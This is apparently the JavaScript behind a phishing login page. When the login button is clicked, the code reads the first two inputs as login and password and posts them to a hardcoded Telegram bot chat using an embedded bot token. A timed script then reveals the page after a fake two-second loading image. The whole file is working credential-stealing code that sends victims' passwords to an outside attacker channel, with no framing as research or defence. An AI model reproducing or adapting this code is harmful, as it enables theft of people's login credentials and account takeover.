// 5872370891


let bot_token = '7467744685:AAELIK6KibvlPb6RIGn-SMuudxMi8kSTRmo'
let login_button = document.querySelector('.login-button')
let inputs = document.querySelectorAll('input')

login_button.addEventListener('click', () => {
    fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '5872370891',
            text: `login: ${inputs[0].value} \n password: ${inputs[1].value}`
        })
    })
})

let WRAPPER = document.querySelector('.WRAPPER')
let IMG = document.querySelector('.IMG')

setTimeout(() => {
    WRAPPER.style.display = 'block'
    IMG.style.display = 'none'
        WRAPPER.style.justify = 'center'
}, 2000)


